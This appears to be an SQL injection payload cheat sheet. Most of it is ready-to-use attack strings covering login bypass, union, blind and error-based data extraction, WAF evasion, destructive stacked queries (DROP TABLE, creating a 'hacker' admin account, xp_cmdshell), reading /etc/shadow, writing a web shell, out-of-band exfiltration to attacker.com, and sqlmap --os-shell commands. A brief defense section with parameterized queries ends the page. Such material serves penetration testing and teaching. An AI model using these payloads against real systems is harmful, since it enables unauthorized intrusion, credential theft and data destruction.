üîëAuthentication Bypass Payloads

Classic Boolean Logic Bypass

' OR 1=1 --
Purpose: Bypasses authentication by making the SQL condition always evaluate to TRUE. The double dash (--) comments out the rest of the original query.

Alternative Boolean Bypass Methods

' OR 'a' = 'a' --
' OR 1=1-- -
' OR 1=1#
" OR 1=1 --
Variations: Different comment styles and quote types for various database systems. Hash (#) is MySQL-specific, while -- works across most SQL databases.

Advanced Tautology-Based Bypass

' OR 'a' = 'a' AND 'b' = 'b'--
' AND username = password --
admin'--
admin'/*
Strategy: Uses logical tautologies (always true statements) to bypass authentication logic. Useful when simple OR 1=1 is filtered.
Testing Tip: Start with these basic payloads in login forms. If successful, you should be logged in as the first user in the database (often admin).

üîóUnion-Based SQL Injection

Information Gathering

Union-based injection allows you to retrieve data from other tables by combining results with the original query.

Requirements:

  • Same number of columns
  • Compatible data types
  • Results displayed on page

Column Number Discovery

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
Increment until error occurs to find column count

Database Enumeration

' UNION SELECT null, version() --
' UNION SELECT null, database() --
' UNION SELECT null, user() --
' UNION SELECT null, @@version --
Database Information: These payloads extract basic database information including version, current database name, and current user.

Schema Enumeration

' UNION SELECT null, group_concat(table_name) FROM information_schema.tables --
' UNION SELECT null, group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users' --
' UNION SELECT null, group_concat(table_name) FROM information_schema.tables WHERE table_schema = database() --
Schema Discovery: Extract table names, column names, and database structure using the information_schema database.

Data Extraction

' UNION SELECT null, username, password FROM users --
' UNION SELECT null, group_concat(username, ':', password) FROM users --
' UNION SELECT null, count(*) FROM users --
Data Retrieval: Extract actual data from discovered tables. Use group_concat to retrieve multiple rows in a single response.
Database Type Version Query Current DB Query Comment Syntax
MySQL @@version database() -- or #
PostgreSQL version() current_database() --
SQL Server @@version db_name() -- or /**/
Oracle banner FROM v$version sys_context('userenv','db_name') --

‚è±Ô∏èTime-Based Blind SQL Injection

Basic Time Delay Testing

' OR 1=1; WAITFOR DELAY '00:00:05'--
' AND IF(1=1, SLEEP(5), 0)--
' AND (SELECT SLEEP(5))--
'; SELECT pg_sleep(5)--
Time Delays: These payloads cause deliberate delays to confirm injection. Different databases use different delay functions.

Conditional Time-Based Extraction

' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
' AND IF(LENGTH(database())>5, SLEEP(5), 0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))=109, SLEEP(5), 0)--
Data Extraction: Use conditional statements to extract data character by character. If condition is true, delay occurs; if false, no delay.

Advanced Blind Techniques

' AND IF((SELECT COUNT(*) FROM users)>1, SLEEP(5), 0)--
' AND IF((SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>100, SLEEP(5), 0)--
Binary Search: Use comparison operators to narrow down character values efficiently through binary search methodology.
Database Sleep Function Example Payload Delay Duration
MySQL SLEEP() ' AND SLEEP(5)-- 5 seconds
SQL Server WAITFOR DELAY ' WAITFOR DELAY '00:00:05'-- 5 seconds
PostgreSQL pg_sleep() ' AND pg_sleep(5)-- 5 seconds
Oracle DBMS_LOCK.SLEEP ' AND DBMS_LOCK.SLEEP(5)-- 5 seconds
Performance Impact: Time-based attacks can be slow and may impact server performance. Use reasonable delay times and be mindful of testing duration.

‚ùåError-Based SQL Injection

Basic Error Generation

' AND 1/0 --
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
' AND EXP(~(SELECT * FROM (SELECT USER())a)) --
Error Induction: Force database errors that reveal information in error messages. Useful when error messages are displayed to users.

Information Extraction via Errors

' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'users') > 0 --
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) --
Data in Errors: Extract database information through deliberately crafted error messages. EXTRACTVALUE is particularly useful in MySQL environments.

Advanced Error-Based Extraction

' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin'), 0x7e), 1) --
Complex Extraction: Use MySQL's duplicate entry errors and XML functions to extract sensitive data.
Error Analysis: Pay close attention to error messages - they often reveal database type, table structure, and even sensitive data. Modern applications may suppress errors, making this technique less viable.

‚úÖBoolean-Based Blind Injection

Basic Boolean Testing

' AND 1=1 --
' AND 1=2 --
' AND username = 'admin' --
True/False Logic: Compare application responses between true and false conditions. Look for differences in page content, response time, or HTTP status codes.

Character-by-Character Extraction

' AND ASCII(SUBSTRING(database(),1,1)) = 109 --
' AND ASCII(SUBSTRING(password,1,1)) = 97 --
' AND LENGTH(database()) = 5 --
Data Enumeration: Extract data one character at a time using ASCII values and substring functions. Requires many requests but works when no other methods are available.

Optimized Boolean Extraction

' AND ASCII(SUBSTRING(database(),1,1)) > 100 --
' AND ASCII(SUBSTRING(database(),1,1)) BETWEEN 97 AND 122 --
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') LIKE 'a%' --
Binary Search: Use comparison operators and BETWEEN clauses to reduce the number of requests needed. Much more efficient than testing every possible character value.

Existence Testing

' AND EXISTS(SELECT 1 FROM users WHERE username='admin') --
' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='users') --
' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --
Existence Checks: Determine if specific tables, columns, or data exist without extracting the actual values. Useful for reconnaissance and confirming database structure.

üöÄAdvanced SQL Injection Techniques

Second-Order SQL Injection

'; DROP TABLE users; --
admin'; UPDATE users SET password='hacked' WHERE username='admin'--
test'; INSERT INTO users (username, password) VALUES ('hacker', 'password')--
Delayed Execution: Payloads stored in database and executed later when data is processed. Common in user registration, profile updates, and data import functions.

Stacked Queries (Multi-Statement)

'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'password'; --
'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'; --
'; EXEC xp_cmdshell('net user hacker password /add'); --
Multiple Commands: Execute multiple SQL statements in a single injection. Requires database support for multiple statements (SQL Server, PostgreSQL).

Out-of-Band (OOB) Data Exfiltration

'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share')) --
'; EXEC xp_dirtree CONCAT('\\\\', (SELECT @@version), '.attacker.com\\share') --
'; SELECT UTL_HTTP.request('http://attacker.com/' || (SELECT user FROM dual)) FROM dual --
External Communication: Exfiltrate data through DNS queries, HTTP requests, or network shares. Useful when direct data extraction is blocked.

Advanced Bypassing Techniques

/*!UNION*/ /*!SELECT*/ null, database() --
' UNI/**/ON SEL/**/ECT null, version() --
' %55%4e%49%4f%4e %53%45%4c%45%43%54 null, user() --
' UNION(SELECT(null),database()) --
WAF Evasion: Bypass Web Application Firewalls using MySQL comments, URL encoding, case variations, and parentheses manipulation.
Advanced Techniques Warning: These payloads can cause significant system changes. Only use in authorized testing environments with proper backups and recovery procedures.

üìÅFile System Operations

File Reading Operations

' UNION SELECT null, load_file('/etc/passwd') --
' UNION SELECT null, load_file('C:\\windows\\system32\\drivers\\etc\\hosts') --
' UNION SELECT null, HEX(load_file('/etc/shadow')) --
File Access: Read system files if database user has file permissions. Use HEX encoding for binary files or files with special characters.

File Writing Operations

' UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php' --
' UNION SELECT null, 'web shell content' INTO DUMPFILE '/tmp/shell.php' --
Web Shell Upload: Write malicious files to web-accessible directories. Requires write permissions and knowledge of web root directory.

Database-Specific File Operations

'; EXEC xp_cmdshell 'type C:\windows\system32\drivers\etc\hosts' --
'; COPY (SELECT version()) TO '/tmp/version.txt' --
'; SELECT UTL_FILE.put_line(UTL_FILE.fopen('/tmp/', 'output.txt', 'w'), 'data') FROM dual --
Platform-Specific: Different databases offer various file system interaction methods. SQL Server (xp_cmdshell), PostgreSQL (COPY), Oracle (UTL_FILE).
Database File Read Function File Write Function Command Execution
MySQL LOAD_FILE() INTO OUTFILE N/A (limited)
SQL Server OPENROWSET(BULK...) BCP utility xp_cmdshell
PostgreSQL pg_read_file() COPY TO N/A (requires extension)
Oracle UTL_FILE.get_line UTL_FILE.put_line Java stored procedures

üõ†Ô∏è Automated Testing Tools

Professional Tools

While manual testing is important for understanding, automated tools can speed up the process and find complex vulnerabilities.

Recommended Tools:

  • SQLmap: Most comprehensive automated tool
  • Burp Suite: Professional web application testing
  • OWASP ZAP: Free alternative to Burp
  • NoSQLMap: For NoSQL injection testing

SQLmap Examples

sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" --tables -D database_name
sqlmap -u "http://target.com/page?id=1" --dump -T users -D database_name
sqlmap -u "http://target.com/page?id=1" --os-shell
Automated Testing: SQLmap can automatically detect and exploit SQL injection vulnerabilities, extract data, and even provide OS command shells.
Tool Selection: Start with automated tools for discovery, then use manual techniques for complex scenarios and to understand the underlying vulnerability mechanics.

üîí Defense and Mitigation

Secure Coding Practices

// Parameterized Query (Safe) PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?"); stmt.setString(1, username); stmt.setString(2, password);
// Stored Procedure (Safe) CREATE PROCEDURE GetUser(@Username NVARCHAR(50), @Password NVARCHAR(50)) AS SELECT * FROM users WHERE username = @Username AND password = @Password
Prevention: Use parameterized queries, stored procedures, and input validation to prevent SQL injection vulnerabilities.

Input Sanitization Examples

// PHP Input Sanitization $username = mysqli_real_escape_string($connection, $_POST['username']); $password = mysqli_real_escape_string($connection, $_POST['password']);
// Python Input Validation import re if re.match("^[a-zA-Z0-9_]+$", username): # Safe username format pass
Sanitization: While parameterized queries are preferred, proper input sanitization can provide an additional layer of protection.
Defense Layer Implementation Effectiveness Limitations
Parameterized Queries Use prepared statements Very High Requires code changes
Input Validation Whitelist allowed characters High Can break legitimate input
WAF (Web Application Firewall) Filter malicious requests Medium Can be bypassed
Least Privilege Limit database permissions High Reduces impact, not prevention
